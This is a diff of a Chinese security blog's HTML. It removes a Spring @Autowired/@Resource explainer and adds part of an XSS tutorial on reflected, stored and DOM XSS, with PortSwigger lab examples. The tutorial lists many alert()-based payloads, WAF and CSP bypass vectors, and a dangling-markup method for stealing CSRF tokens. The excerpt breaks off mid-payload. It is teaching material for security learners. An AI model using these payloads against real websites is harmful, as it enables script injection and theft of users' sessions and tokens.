-<h3 id="三，对象注入中的问题"><a href="#三，对象注入中的问题" class="headerlink" title="三，对象注入中的问题"></a>三，对象注入中的问题</h3><h4 id="3-1，-Autowired-和-Resource"><a href="#3-1，-Autowired-和-Resource" class="headerlink" title="3.1，@Autowired 和 @Resource"></a>3.1，@Autowired 和 @Resource</h4><p>在进行类注入时，除了可以使用<code>@Autowired</code>​注解之外，我们还可以使用<code>@Resource</code>​注解进行注入。</p>
-<p><img src="/.com//image-20250519114041-uhz25b2.png" alt="image"></p>
-<p>​<code>@Autowired</code>​ 和 <code>@Resource</code>​ 都是在 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Spring%20%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">Spring 框架</a>中用于注入依赖的注解，它们有以下区别：</p>
-<ol>
-<li><p><strong>来源不同：</strong></p>
-<ul>
-<li>​<code>@Autowired</code>​ 是 Spring 框架提供的注解，通过类型进行依赖注入。</li>
-<li>​<code>@Resource</code>​ 是 JavaEE 定义的注解，通过名称进行依赖注入。</li>
-</ul>
-</li>
-<li><p><strong>注入方式不同：</strong></p>
-<ul>
-<li>​<code>@Autowired</code>​ 默认按照类型匹配的方式进行注入，如果存在多个相同类型的实例，可以结合 <code>@Qualifier</code>​ 注解来指定具体实例。</li>
-<li>​<code>@Resource</code>​ 默认按照名称匹配的方式进行注入，它支持使用 <code>name</code>​ 或 <code>type</code>​ 属性来指定名称或类型进行匹配。</li>
-</ul>
-</li>
-<li><p><strong>支持的类型不同：</strong></p>
-<ul>
-<li>​<code>@Autowired</code>​ 支持通过构造方法注入、属性注入、Setter 注入的方式实现依赖注入。</li>
-<li>​<code>@Resource</code>​ 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入。</li>
-</ul>
-</li>
-<li><p><strong>应用范围不同：</strong></p>
-<ul>
-<li>​<code>@Autowired</code>​ 主要用于 Spring 框架中的组件（如 Spring Bean）的依赖注入。</li>
-<li>​<code>@Resource</code>​ 是 JavaEE 规范中的注解，它可以用于依赖注入和资源的获取，对于不依赖于 Spring 框架的应用也可以使用。</li>
-</ul>
-</li>
-</ol>
-<h4 id="3-2，同⼀类型多个-Bean-报错"><a href="#3-2，同⼀类型多个-Bean-报错" class="headerlink" title="3.2，同⼀类型多个 @Bean 报错"></a>3.2，同⼀类型多个 @Bean 报错</h4><p>当出现多个 Bean 返回同⼀对象类型时，程序会报错。解决同一个类型，多个bean的解决方案有以下两个：</p>
-<p><strong>1，使用</strong>  <strong>​<code>@Resource(name=&quot;&quot;)</code>​</strong> ​</p>
-<p><img src="/.com//image-20250519114126-lew7r0p.png" alt="image"></p>
-<p><strong>2，搭配</strong>  <strong>​<code>@Autowired</code>​</strong>​ <strong>使用</strong>  <strong>​<code>@Qualifierr(value = &quot;&quot;)</code>​</strong> ​</p>
-<p><img src="/.com//image-20250519114131-ekqswo4.png" alt="image"></p>
-<p>核心总结<br>1，三种对象注入的实现方式以及优缺点？<br>属性注入，Setter注入和构造方法注入是在依赖注入中常用的三种方式，它们各有优缺点：</p>
-<p>1，属性注入方式：其实现简单，易于理解和维护，但是其不能注入不可变对象，只适用于IoC容器，并且违反单一设计原则的概率大。</p>
-<p>2，Setter注入方式：其符合单一设计原则，但是其不能注入不可变对象，并且使用Setter注入的对象可能被修改。</p>
-<p>3，构造方法注入方式：其可以注入不可变对象，注入的对象不能被改变，保证注入对象完全被初始化，并且具有通用性，但是其不符合单一设计原则。</p>
-<p>注意：在上述的三种对象注入的实现方式中，构造方法注入是Spring推荐的注入方式。</p>
-<hr>
-<p><strong>思考：为什么构造方法可以注入不可变变量，而属性注入和Setter注入却不行呢？</strong></p>
-<p>解答：在 Java 中，被<code>final</code>​修饰的对象，要么直接进行赋值，要么就在构造方法中进行赋值，两种情况必须满足一个，否则方式报错。</p>
-<hr>
-<p>2，@Autowired 和 @Resource 注入注解的区别？<br>@Autowired 和 @Resource 都是在 Spring 框架中用于注入依赖的注解，它们有以下区别：</p>
-<p>1，来源不同：@Autowired 是 Spring 框架提供的注解，而@Resource 是 JavaEE 定义的注解。</p>
-<p>2，注入方式不同：@Autowired 默认按照类型匹配的方式进行注入，而@Resource 默认按照名称匹配的方式进行注入。</p>
-<p>3，支持的类型不同：@Resource 支持通过属性注入、Setter 注入的方式实现依赖注入，不支持构造方法注入，而@Autowired 支持。</p>
-<p>4，应用范围不同：@Autowired 主要用于 Spring 框架中的组件的依赖注入，而@Resource对于不依赖于 Spring 框架的应用也可使用。</p>
-<hr>
-<h4 id="3，同⼀类型多个-Bean-报错的解决方案有哪些？"><a href="#3，同⼀类型多个-Bean-报错的解决方案有哪些？" class="headerlink" title="3，同⼀类型多个 @Bean 报错的解决方案有哪些？"></a>3，同⼀类型多个 @Bean 报错的解决方案有哪些？</h4><p>解决同一个类型 @Bean 报错的解决方案有以下两个：</p>
-<ol>
-<li>使用 <code>@Resource(name=&quot;&quot;)</code>​</li>
-<li>使用 <code>@Qualifierr(value = &quot;&quot;)</code>​ 【搭配@Autowired使用】</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" data-id="cmawb0xv5000t747k5wvr9ozn" data-title="反序列化对象注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-Web/XSS/XSS-labs通关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/05/20/Web/XSS/XSS-labs%E9%80%9A%E5%85%B3/" class="article-date">
@@ -997,11 +448,399 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/XSS/XSS-labs%E9%80%9A%E5%85%B3/" data-id="cmawb0xv6000w747k93s88h6f" data-title="XSS-labs通关教程" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/05/20/Web/XSS/XSS-labs%E9%80%9A%E5%85%B3/" data-id="cmawcfx98001acg7k74pb92el" data-title="XSS-labs通关教程" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/XSS/从0到1完全掌握 XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/" class="article-date">
+  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/">从0到1完全掌握XSS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="从0到1完全掌握-XSS"><a href="#从0到1完全掌握-XSS" class="headerlink" title="从0到1完全掌握 XSS"></a>从0到1完全掌握 XSS</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。</p>
+<blockquote>
+<p>XSS 的本质是一种高级钓鱼手法。</p>
+</blockquote>
+<h2 id="0x02-什么是-XSS"><a href="#0x02-什么是-XSS" class="headerlink" title="0x02 什么是 XSS"></a>0x02 什么是 XSS</h2><p>XSS (Cross Site Scripting) 攻击全称<strong>跨站脚本攻击</strong>，是为不和<strong>层叠样式表</strong> (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。<br>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许<strong>恶意 Web 用户</strong>将代码植入到提供给<strong>其它用户使用的页面</strong>中。</p>
+<ul>
+<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。</li>
+</ul>
+<p><img src="/.com//image-20250519114353-hnupv1m.png" alt="image"></p>
+<h2 id="0x03-XSS-的危害"><a href="#0x03-XSS-的危害" class="headerlink" title="0x03 XSS 的危害"></a>0x03 XSS 的危害</h2><p>前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
+<h2 id="0x04-XSS-简单应用场景举例"><a href="#0x04-XSS-简单应用场景举例" class="headerlink" title="0x04 XSS 简单应用场景举例"></a>0x04 XSS 简单应用场景举例</h2><p>这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。</p>
+<p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image">	​</p>
+<ul>
+<li>这里借用国光师傅的图片进行分析</li>
+</ul>
+<p><img src="/.com//image-20250519114457-xl4w7mw.png" alt="image"></p>
+<p>这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入username%20<script>alert(document.cookie)</script>，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。</p>
+<hr>
+<h2 id="XSS-基本攻击手段"><a href="#XSS-基本攻击手段" class="headerlink" title="XSS 基本攻击手段"></a>XSS 基本攻击手段</h2><ul>
+<li>XSS 根据效果不同主要分为三种类型</li>
+<li>反射型 XSS，存储型 XSS，DOM 型 XSS</li>
+</ul>
+<p>危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~= DOM 型 XSS<br>我们接下来细讲一下这三种 XSS 的攻击手段。</p>
+<h3 id="1-反射型-XSS-及绕过手段"><a href="#1-反射型-XSS-及绕过手段" class="headerlink" title="1. 反射型 XSS 及绕过手段"></a>1. 反射型 XSS 及绕过手段</h3><h4 id="1-什么是反射型-XSS"><a href="#1-什么是反射型-XSS" class="headerlink" title="(1) 什么是反射型 XSS"></a>(1) 什么是反射型 XSS</h4><p>反射型 XSS，也叫非持久型 XSS，转瞬即逝。</p>
+<p>利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。</p>
+<p>反射型 XSS 的 Payload 如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250519170804-2sjs41c.png" alt="image"></p>
+<p>效果如图所示</p>
+<p><img src="/.com//image-20250519170813-4tfx507.png" alt="image"></p>
+<h5 id="一、当大多数标签被禁止时的绕过"><a href="#一、当大多数标签被禁止时的绕过" class="headerlink" title="一、当大多数标签被禁止时的绕过"></a>一、当大多数标签被禁止时的绕过</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p>
+</blockquote>
+<p>还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。</p>
+<p>探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onresize=print()&gt;&quot; onload=this.style.width=&#x27;100px&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//image-20250519171044-j7g2u17.png" alt="image"></p>
+<h5 id="二、当事件处理器与-href-被禁用时的绕过"><a href="#二、当事件处理器与-href-被禁用时的绕过" class="headerlink" title="二、当事件处理器与 href 被禁用时的绕过"></a>二、当事件处理器与 href 被禁用时的绕过</h5><ul>
+<li>老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，<code>svg</code>​标签的绕过方式还是主流。</li>
+</ul>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></p>
+</blockquote>
+<p>Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line">	&lt;a&gt;</span><br><span class="line">	&lt;animate attributeName=href</span><br><span class="line">     values=javascript:alert(1) /&gt;</span><br><span class="line">		&lt;text x=20 y=20&gt;Click me&lt;/text&gt;</span><br><span class="line">    &lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还有一些<code>svg</code>​标签的绕过手段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="三、对-script-进行闭合后构造-Payload"><a href="#三、对-script-进行闭合后构造-Payload" class="headerlink" title="三、对 script 进行闭合后构造 Payload"></a>三、对 script 进行闭合后构造 Payload</h5><p>对某些语句中的符号进行闭合。<br>有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。</p>
+<ul>
+<li>XSS Insert Into-&gt; JavaScript</li>
+</ul>
+<p>这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用<code>&lt;script&gt;</code>​标签。</p>
+<p>一般的 Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(document.domain)-&#x27; </span><br><span class="line">&#x27;;alert(document.domain)//</span><br></pre></td></tr></table></figure>
+
+<h5 id="四、绕过-CSP-攻击"><a href="#四、绕过-CSP-攻击" class="headerlink" title="四、绕过 CSP 攻击"></a>四、绕过 CSP 攻击</h5><ul>
+<li>CSP：content security policy，比较严格的防御 XSS 手段。</li>
+</ul>
+<p>它一般在 HTTP 包里面长这样</p>
+<p><img src="/.com//image-20250519171202-sovbupc.png" alt="image"></p>
+<p>CSP通过这样的指令限制只能加载与页面本身相同来源的资源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过下面的指令限制只能从指定域中加载资源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src https://scripts.normal-website.com</span><br></pre></td></tr></table></figure>
+
+<p>但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。</p>
+<ul>
+<li>CSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。</li>
+<li>CSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。</li>
+</ul>
+<h6 id="绕过方式一-悬空标记攻击"><a href="#绕过方式一-悬空标记攻击" class="headerlink" title="绕过方式一 悬空标记攻击"></a>绕过方式一 悬空标记攻击</h6><ul>
+<li>这种和闭合语句的攻击差不多。</li>
+</ul>
+<p>虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用<code>img</code>​标签窃取 CSRF 令牌。</p>
+<p>有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。</p>
+<p>但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</a></p>
+</blockquote>
+<p>首先我们观察一下修改邮箱的表单要提交哪些信息</p>
+<p><img src="/.com//image-20250519171227-fw71hjh.png" alt="image"></p>
+<p>接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload</p>
+<p><img src="/.com//image-20250519171235-02jsgfn.png" alt="image"></p>
+<p>再然后用 CSRF 盗用 token，再发包即可。</p>
+<h6 id="绕过方式二-对-CSP-限制不严格的情况下攻击"><a href="#绕过方式二-对-CSP-限制不严格的情况下攻击" class="headerlink" title="绕过方式二 对 CSP 限制不严格的情况下攻击"></a>绕过方式二 对 CSP 限制不严格的情况下攻击</h6><ul>
+<li>CSP 是有设置的，若<code>base-url</code>​为空的话，可以通过 token 值来添加新的 CSP 指令。</li>
+</ul>
+<p>Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们使用<code>script-src-elem</code>​对 CSP 进行覆盖，从而进行 XSS 攻击。</p>
+<hr>
+<h3 id="2-存储型-XSS"><a href="#2-存储型-XSS" class="headerlink" title="2. 存储型 XSS"></a>2. 存储型 XSS</h3><p>存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。</p>
+<p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image"></p>
+<ul>
+<li>如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。</li>
+</ul>
+<p><img src="/.com//image-20250519171316-dariuk1.png" alt="image"></p>
+<p>我们在新增的评论中将 username 构造成 Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。</p>
+<ul>
+<li>绕过手段不再逼逼，和反射型 XSS 是异曲同工。</li>
+</ul>
+<hr>
+<h3 id="3-DOM-型-XSS-重点"><a href="#3-DOM-型-XSS-重点" class="headerlink" title="3. DOM 型 XSS(重点!)"></a>3. DOM 型 XSS(重点!)</h3><p>DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如<code>img</code>​，<code>input</code>​等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。</p>
+<blockquote>
+<p>我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。</p>
+</blockquote>
+<p>DOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。</p>
+<ul>
+<li>我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1838791">HACK 师傅的文章</a></li>
+</ul>
+<h4 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><strong>一些常用的标签与属性</strong></h4><p>下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
+<h5 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><strong>scirpt 标签</strong></h5><p>​<code>&lt;script&gt;</code>​标签用于定义客户端脚本，比如 JavaScript。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><strong>img 标签</strong></h5><p>​<code>&lt;img&gt;</code>​标签定义 HTML 页面中的图像。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><strong>input 标签</strong></h5><p>​<code>&lt;input&gt;</code>​标签规定了用户可以在其中输入数据的输入字段。<br>onfocus 事件在对象获得焦点时发生：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>竞争焦点，从而触发 onblur 事件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<p>input 标签的 autofocus 属性规定当页面加载时<code>&lt;input&gt;</code>​元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><strong>details 标签</strong></h5><p>​<code>&lt;details&gt;</code>​标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭<code>&lt;details&gt;</code>​元素时触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><strong>svg 标签</strong></h5><p>​<code>&lt;svg&gt;</code>​标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><strong>select 标签</strong></h5><p>​<code>&lt;select&gt;</code>​标签用来创建下拉列表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><strong>iframe 标签</strong></h5><p>​<code>&lt;iframe&gt;</code>​标签会创建包含另外一个文档的内联框架。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><strong>video 标签</strong></h5><p>​<code>&lt;video&gt;</code>​标签定义视频，比如电影片段或其他视频流。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><strong>audio 标签</strong></h5><p>​<code>&lt;audio&gt;</code>​标签定义声音，比如音乐或其他音频流。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><strong>body 标签</strong></h5><p>​<code>&lt;body&gt;</code>​标签定义文档的主体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span 